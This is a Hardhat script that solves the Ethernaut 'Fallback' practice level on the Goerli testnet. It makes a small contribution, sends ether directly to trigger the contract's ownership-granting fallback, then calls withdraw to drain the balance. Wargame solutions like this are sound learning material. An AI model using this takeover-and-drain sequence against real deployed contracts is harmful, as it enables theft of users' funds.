import { FALLBACK } from "../constants"
import { ethers, network } from "hardhat"

import { developmentChains, networkConfig } from "../helper-hardhat-config"

const main = async () => {
    if (network.name != "goerli") {
        throw "invalid network. change network to goerli"
    }

    const ethernaut = await ethers.getContractAt("Fallback", FALLBACK)
    const exploiter = (await ethers.getSigners())[0]

    const owner = await ethernaut.owner()
    console.log("owner", owner)

    const transferAmt = ethers.utils.parseEther("0.000000001")

    // contribute 0.0000001 eth
    const contributeTx = await ethernaut.connect(exploiter).contribute({
        value: transferAmt,
    })
    await contributeTx.wait(1)

    console.log(
        "exploiter contribution",
        ethers.utils.formatEther(await ethernaut.contributions(exploiter.address))
    )

    console.log(
        "ethernaut contract balance before exploit",
        ethers.utils.formatEther(await ethers.provider.getBalance(FALLBACK))
    )

    const tx = { to: ethernaut.address, value: ethers.utils.parseEther("0.000000001") }
    const txResponse = await exploiter.sendTransaction(tx)
    await txResponse.wait(1)

    const drainTx = await ethernaut.connect(exploiter).withdraw()
    const drainTxReceipt = await drainTx.wait(1)
    console.log("drain tx receipt", drainTxReceipt)

    console.log(
        "fallback contract balance after exploit",
        ethers.utils.formatEther(await ethers.provider.getBalance(FALLBACK))
    )
}

main()
    .then(() => {
        console.log("script successful")
        process.exit(0)
    })
    .catch((e) => {
        console.log(e)
        process.exit(1)
    })
